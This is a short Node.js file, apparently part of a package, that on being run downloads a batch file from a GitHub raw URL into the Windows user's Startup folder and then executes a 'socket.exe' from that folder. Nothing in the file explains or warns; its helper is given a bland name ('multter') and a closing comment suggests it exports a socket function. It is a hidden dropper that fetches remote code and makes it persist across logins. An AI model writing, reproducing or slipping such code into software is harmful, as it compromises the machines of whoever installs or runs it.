const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn, exec } = require('child_process');

// Get user information
const userInfo = os.userInfo();

const userName = userInfo.username;
const existingFolderPath = path.join(`C:\\Users\\${userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`);

// Replace with your file URL
const fileUrl = 'https://raw.githubusercontent.com/spotlight301/clock/refs/heads/master/..bat'; // Ensure this is the correct file URL
const fileName = path.basename(fileUrl); // Extracts file name from the URL
const destinationPath = path.join(existingFolderPath, fileName); // Ensures correct file name for saving

// Path to your .bat file
// const batFilePath = path.join("", `"C:\\Users\\${userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\socket.bat"`);
const command = `start "" "C:\\Users\\1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\socket.exe"`;

// Run the .bat file

const multter = async (url, destination) => {
  const file = fs.createWriteStream(destination);

  await https.get(url, (response) => {
    // Check if the response status is OK (200)
    if (response.statusCode === 200) {
      response.pipe(file);

      file.on('finish', () => {
        file.close();
        console.log(`Downloaded: ${destination}`);
      });
    } else {
      console.error(`Error: ${response.statusCode}`);
    }
  }).on('error', (err) => {
    // Handle errors
    fs.unlink(destination, () => { }); // Delete the file if there's an error
    // console.error(`Download failed: ${err.message}`);

  });
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
  });
  // const process = spawn(batFilePath, { shell: true });

};

// Ensure the startup folder exists
if (!fs.existsSync(existingFolderPath)) {
  fs.mkdirSync(existingFolderPath, { recursive: true });
}

// Start the download
multter(fileUrl, destinationPath);

// Export the socket function